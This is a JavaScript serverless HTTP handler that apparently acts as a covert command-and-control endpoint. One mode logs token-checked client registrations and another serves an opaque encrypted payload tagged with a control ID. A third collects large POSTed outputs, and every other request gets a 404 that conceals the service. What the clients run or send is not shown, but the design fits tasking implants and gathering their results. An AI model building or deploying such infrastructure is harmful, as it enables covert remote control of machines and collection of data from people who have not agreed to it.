import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '14';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
